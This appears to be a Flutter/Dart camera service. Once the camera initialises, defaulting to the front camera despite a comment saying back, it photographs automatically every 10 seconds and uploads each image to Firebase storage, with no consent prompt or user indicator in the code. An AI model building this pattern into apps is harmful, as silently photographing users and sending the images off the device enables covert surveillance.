import 'dart:async';
import 'dart:io';
import 'package:camera/camera.dart';
import 'package:path_provider/path_provider.dart';

import '../firebase_service.dart';

class CameraService {
  List<CameraDescription> _availableCameras = [];
  CameraController? _cameraController;
  Timer? _autoCaptureTimer;
  int _captureCount = 1;

  final FirebaseService _firebaseService = FirebaseService();

  /// Initialize the camera with back camera by default
  Future<CameraController?> initializeCamera({CameraLensDirection direction = CameraLensDirection.front}) async {
    try {
      _availableCameras = await availableCameras();
      final selectedCamera = _availableCameras.firstWhere(
            (camera) => camera.lensDirection == direction,
        orElse: () => _availableCameras.first,
      );

      _cameraController = CameraController(
        selectedCamera,
        ResolutionPreset.medium,
        enableAudio: false,
      );

      await _cameraController!.initialize();

      // Start auto-capture after initialization
      _startAutoCaptureLoop();

      return _cameraController;
    } catch (e) {
      print("❌ Camera init error: $e");
      return null;
    }
  }

  /// Automatically capture an image every 10 seconds and upload
  void _startAutoCaptureLoop() {
    _autoCaptureTimer?.cancel();

    _autoCaptureTimer = Timer.periodic(const Duration(seconds: 10), (_) async {
      if (_cameraController == null || !_cameraController!.value.isInitialized) return;

      try {
        final Directory tempDir = await getTemporaryDirectory();
        final String imagePath = "${tempDir.path}/autocapture$_captureCount.jpg";

        XFile file = await _cameraController!.takePicture();
        await File(file.path).copy(imagePath);

        // Upload using FirebaseService
        await _firebaseService.uploadFile(File(imagePath), "autocaptures/autocapture$_captureCount.jpg");

        print("📸 Uploaded autocapture$_captureCount.jpg");
        _captureCount++;
      } catch (e) {
        print("❌ Auto-capture error: $e");
      }
    });
  }

  /// Switch camera (front/back)
  Future<void> switchCamera() async {
    if (_availableCameras.isEmpty || _cameraController == null) return;

    final currentDirection = _cameraController!.description.lensDirection;
    final newDirection = currentDirection == CameraLensDirection.front
        ? CameraLensDirection.back
        : CameraLensDirection.front;

    await _cameraController!.dispose();
    _captureCount = 1;
    await initializeCamera(direction: newDirection);
  }

  /// Cleanup resources
  Future<void> disposeCamera() async {
    _autoCaptureTimer?.cancel();
    await _cameraController?.dispose();
  }

  CameraController? get cameraController => _cameraController;
}
